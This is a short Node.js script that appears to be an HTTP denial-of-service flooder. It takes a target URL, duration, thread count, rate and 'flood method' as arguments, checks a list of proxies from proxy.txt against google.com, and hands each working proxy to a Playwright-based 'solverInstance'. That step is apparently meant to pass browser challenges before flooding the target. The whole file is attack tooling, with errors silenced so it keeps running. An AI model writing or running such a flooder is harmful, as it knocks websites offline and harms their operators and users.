process.on('uncaughtException', function(er) {
});
process.on('unhandledRejection', function(er) {
});

require('events').EventEmitter.defaultMaxListeners = 0;

const { solverInstance } = require('./playwright');
const { spawn } = require('child_process');

const fs = require('fs');
const colors = require('colors');
const request = require("request");
const validProxies = [];

const urlT = process.argv[2];
const timeT = process.argv[3];
const threadsT = process.argv[5]; // Flooder Threads
const rateT = process.argv[6]; // Rate per IP
const methodT = process.argv[7]; // Flood Method

const proxies = fs.readFileSync("proxy.txt", 'utf-8').toString().replace(/\r/g, '').split('\n');


function check_proxy(proxy) {
	request({
		url: "https://google.com/",
		proxy: "http://" + proxy,
		headers: {
			'User-Agent': "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36",
		}
	}, (err, res, body) => {
		if (!err) {
			validProxies.push(proxy);
		}
	});
}
async function sessionIn() {
	validProxies.forEach((e) => {
			solverInstance({
				"Target": urlT,
				"Time": timeT,
				"Threads": threadsT,
				"Rate": rateT,
				"Method": methodT,
				"Proxy": e
		}).then((cookie, _) => {
		}).catch((ee) => {
			console.log('\x1b[33m%s\x1b[0m', 'hi!');
		})
	})
}

function main() {
	proxies.forEach((e) => {
		check_proxy(e);
	})

	setTimeout(() => {
		return sessionIn();
	}, 15 * 1000);
}

main();

setTimeout(() => {
    process.exit(0);
    process.exit(0);
    process.exit(0);
}, timeT * 1000)

// sessionIn();
